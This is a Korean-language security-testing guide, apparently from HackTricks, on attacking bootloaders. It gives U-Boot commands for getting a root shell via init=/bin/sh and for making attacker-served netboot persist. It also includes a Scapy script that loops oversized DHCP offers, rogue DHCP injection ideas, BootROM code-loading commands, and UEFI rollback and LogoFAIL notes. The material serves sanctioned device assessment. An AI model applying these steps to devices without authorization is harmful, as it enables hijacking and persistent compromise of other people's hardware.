# 부트로더 테스트

{{#include ../../banners/hacktricks-training.md}}

다음 단계들은 U-Boot나 UEFI 계열 로더 같은 부트로더를 테스트하고 장치의 시작 구성(startup configurations)을 변경할 때 권장됩니다. 초점은 초기 코드 실행(early code execution) 확보, 서명/롤백 보호(signature/rollback protections) 평가, 그리고 복구(recovery)나 네트워크 부트 경로의 악용에 맞춥니다.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 빠른 팁 및 환경 악용

1. 인터프리터 셸에 접근하기
- 부팅 중 `bootcmd`가 실행되기 전에 알려진 중단 키(대부분 아무 키, 0, space, 또는 보드별 "magic" 시퀀스)를 눌러 U-Boot 프롬프트로 진입합니다.

2. 부트 상태와 변수 점검
- 유용한 명령:
- `printenv` (환경 덤프)
- `bdinfo` (보드 정보, 메모리 주소)
- `help bootm; help booti; help bootz` (지원되는 커널 부트 방법)
- `help ext4load; help fatload; help tftpboot` (사용 가능한 로더)

3. 루트 셸을 얻기 위해 부트 인자 수정
- 커널이 정상 init 대신 셸로 빠지게 `init=/bin/sh`를 추가:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP 서버에서 Netboot
- 네트워크를 구성하고 LAN에서 커널/fit 이미지를 가져옵니다:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 환경을 통해 변경 사항 영구화
- env 저장소가 쓰기 보호되지 않았다면 제어권을 영구화할 수 있습니다:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` 같은 변수를 확인하세요. 잘못 설정된 값은 반복적으로 셸 진입을 허용할 수 있습니다.

6. 디버그/안전하지 않은 기능 확인
- 다음을 찾아보세요: `bootdelay` > 0, `autoboot` 비활성화, 제한 없는 `usb start; fatload usb 0:1 ...`, 시리얼을 통한 `loady`/`loads` 가능성, 신뢰할 수 없는 매체에서의 `env import`, 서명 검사가 없는 커널/ramdisk 로드 등.

7. U-Boot 이미지/검증 테스트
- 플랫폼이 FIT 이미지로 secure/verified boot를 주장하면 unsigned 또는 변조된 이미지를 시도해 보세요:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`가 없거나 레거시 `verify=n` 동작이 있으면 임의 페이로드 부팅이 가능한 경우가 많습니다.

## 네트워크 부트 표면(DHCP/PXE) 및 악성 서버

8. PXE/DHCP 파라미터 퍼징
- U-Boot의 레거시 BOOTP/DHCP 처리는 메모리 안전성 문제가 있었습니다. 예를 들어 CVE‑2024‑42040은 조작된 DHCP 응답을 통해 U-Boot 메모리의 바이트를 네트워크로 leak할 수 있음을 설명합니다. 길거나 엣지 케이스 값을 사용해 DHCP/PXE 코드 경로를 테스트(옵션 67 bootfile-name, vendor options, file/servername 필드 등)하고 멈춤/누출 여부를 관찰하세요.
- netboot 중 부팅 파라미터를 스트레스하는 최소 Scapy 스니펫:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 또한 PXE 파일명 필드가 OS 측 프로비저닝 스크립트에 체인될 때 셸/로더 로직으로 검증 없이 전달되는지 확인하세요.

9. 악성 DHCP 서버를 통한 명령 주입 테스트
- rogue DHCP/PXE 서비스를 구축하고 파일명이나 옵션 필드에 문자를 주입해 부트 체인의 후단에서 명령 인터프리터에 도달할 수 있는지 시도하세요. Metasploit의 DHCP auxiliary, `dnsmasq`, 또는 커스텀 Scapy 스크립트가 유용합니다. 반드시 테스트 네트워크를 격리하세요.

## 정상 부트를 무시하는 SoC ROM 복구 모드

많은 SoC는 BootROM "loader" 모드를 제공하여 플래시 이미지가 유효하지 않아도 USB/UART를 통해 코드를 수용합니다. secure-boot fuse가 블로운(타버린) 상태가 아니라면 이는 체인에서 매우 초기의 임의 코드 실행을 제공할 수 있습니다.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

장치에 secure-boot eFuses/OTP가 블로운(프로그램된) 상태인지 평가하세요. 그렇지 않다면 BootROM 다운로드 모드는 상위 수준의 검증(U-Boot, kernel, rootfs)을 우회하여 SRAM/DRAM에서 직접 첫 단계 페이로드를 실행하는 경우가 흔합니다.

## UEFI/PC 클래스 부트로더: 빠른 점검

10. ESP 변조 및 롤백 테스트
- EFI System Partition(ESP)을 마운트하고 로더 구성 요소를 확인하세요: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, 벤더 로고 경로 등.
- Secure Boot revocations(dbx)이 최신이 아니라면 다운그레이드되었거나 알려진 취약한 서명된 부트 컴포넌트를 사용해 부팅해 보세요. 플랫폼이 오래된 shim/bootmanager를 여전히 신뢰하면 ESP에서 자신의 커널이나 `grub.cfg`를 로드해 영구성을 얻을 수 있습니다.

11. 부트 로고 파싱 취약점(LogoFAIL 계열)
- 여러 OEM/IBV 펌웨어는 부트 로고를 처리하는 DXE의 이미지 파싱 결함에 취약했습니다. 공격자가 ESP의 벤더 전용 경로(예: `\EFI\<vendor>\logo\*.bmp`)에 조작된 이미지를 놓을 수 있고 재부팅하면 Secure Boot가 활성화되어 있어도 초기 부트 중 코드 실행이 가능할 수 있습니다. 플랫폼이 사용자 제공 로고를 허용하는지, 해당 경로가 OS에서 쓰기 가능한지 테스트하세요.

## 하드웨어 주의

초기 부트 중 SPI/NAND 플래시와 상호작용할 때(예: 읽기 우회용 핀 접지) 주의하세요. 항상 플래시 데이터시트를 참조하십시오. 타이밍이 맞지 않는 숏은 장치나 프로그래머를 손상시킬 수 있습니다.

## 참고 및 추가 팁

- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 사용해 환경 블롭을 RAM과 저장소 사이에 이동해 보세요; 일부 플랫폼은 인증 없이 이동식 매체에서 env를 임포트할 수 있습니다.
- extlinux.conf로 부팅하는 Linux 기반 시스템에서 persistence를 얻으려면 부트 파티션의 `APPEND` 라인을 수정(예: `init=/bin/sh` 또는 `rd.break`)하는 것만으로 충분한 경우가 많습니다(서명 검사가 강제되지 않는 경우).
- userland에서 `fw_printenv/fw_setenv`를 제공하는 경우 `/etc/fw_env.config`가 실제 env 저장소와 일치하는지 검증하세요. 잘못된 오프셋은 잘못된 MTD 영역을 읽거나 쓰게 할 수 있습니다.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
